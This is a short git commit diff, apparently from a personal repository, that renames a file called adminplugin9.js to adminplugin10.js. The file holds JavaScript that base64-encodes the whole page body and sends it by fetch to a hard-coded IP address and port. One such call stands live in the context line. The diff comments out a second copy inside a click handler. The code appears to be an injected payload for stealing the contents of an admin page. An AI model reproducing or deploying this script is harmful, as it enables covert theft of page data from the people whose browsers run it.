1c079879def83e0e9ba864b3cf22bb0ca373c540
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 08:40:31 +0100

    Update and rename adminplugin9.js to adminplugin10.js

--- adminplugin10.js
+++ adminplugin10.js
@@ -4,9 +4,9 @@ fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML)
 
 link.addEventListener('click', function(event) {
     event.preventDefault();
-    link.click();
-    window.addEventListener('load', function() {
-      fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
-    });
+    //link.click();
+    //window.addEventListener('load', function() {
+      //fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
+    //});
  
 }
